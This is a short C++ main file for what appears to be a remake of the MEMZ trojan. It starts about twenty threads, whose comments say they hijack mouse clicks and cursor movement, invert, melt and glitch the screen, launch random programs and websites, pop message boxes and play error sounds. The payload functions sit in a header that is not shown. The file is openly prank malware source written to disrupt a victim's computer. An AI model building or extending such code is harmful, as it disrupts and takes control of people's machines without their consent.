#include <thread> // I Don't Know Why It Cannot Build In MEMZ.h
#include "MEMZ.h" // Process Main 

using namespace std;

int main()
{
	disable_redraw(); // Disable Redraw
	// Main Process Zone //
    thread a(infclick); // Random Click
    thread b(infInvColor); // Invert Screen Color
    thread c(infIcon); // Random Draw Icons
    thread d(infCursor); // Random Move Mouse
    thread e(infChange); // Invert String
    thread f(inftunnel); // Draw Tunnel Effect
    thread g(randomDraw); // Random Draw Lines
	thread h(infplay); // Play System Error Sounds
	thread i(infBlink); // Screen Blink
	thread j(InvertColor_slow); // Invert Screen Color (Slow) Like "Nepotonod"
	thread k(ScreenMelter); // Screen Melter Like "Nepotonod"
	thread l(infShock); // Window Shocker
	thread m(randomExecute); // Random Execute Some Programs/Websites
	thread n(iconAura); // Draw Icons Around The Mouse
	thread o(randomSeed); // Generate A New Random Seed Per 300ms
	thread p(payloadMessageBox); // Pop Message Boxs
	thread q(infglitch); // Glitch Screen
	thread r(randomOutput); // Random Print Texts
	thread s(rand_beep); // Random Beep
	thread t(sayNyan); // Your computer was not trashed by the MEMZ Trojan. Now you can't enjoy the Nyan Cat~
    getchar(); // Pause Program
	return 0; // Normal Exit
}
